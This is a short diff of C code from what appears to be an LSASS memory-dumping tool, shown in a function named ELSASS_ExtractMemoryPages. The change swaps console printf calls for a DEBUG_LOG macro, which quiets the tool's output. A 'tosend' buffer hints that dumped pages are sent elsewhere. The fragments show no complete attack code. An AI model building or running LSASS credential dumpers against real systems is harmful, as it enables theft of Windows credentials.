@@ -148,11 +148,11 @@ PDumpMemoryDescriptor64 ELSASS_ExtractMemoryPages(PDUMPCONTEXT dc, PMODULEINFO m
     char tosend[1024];
     curr_range = memory_ranges;
 
-    printf("[*] There is %llu memory ranges\n", number_of_ranges);
+    DEBUG_LOG("[*] There is %llu memory ranges\n", number_of_ranges);
     while (curr_range && i <= number_of_ranges)
     {
         int rounds = 1;
-        printf("page size: %llu\n", curr_range->DataSize);
+        DEBUG_LOG("page size: %llu\n", curr_range->DataSize);
         for (int rep = 0; rep < rounds; rep++)
         {
             ULONG64 offset = 0;
@@ -183,7 +183,7 @@ PDumpMemoryDescriptor64 ELSASS_ExtractMemoryPages(PDUMPCONTEXT dc, PMODULEINFO m
             if (i == 0)
             {
                 i = dc->rva;
-                printf("Writing to %d offset\n", i);
+                DEBUG_LOG("Writing to %d offset\n", i);
                 i = 0;
             }
 
@@ -198,7 +198,7 @@ PDumpMemoryDescriptor64 ELSASS_ExtractMemoryPages(PDUMPCONTEXT dc, PMODULEINFO m
 
         if (i % 10 == 0)
         {
-            printf("[*] Pass: %d\n", i);
+            DEBUG_LOG("[*] Pass: %d\n", i);
         }
 
         curr_range = curr_range->next;
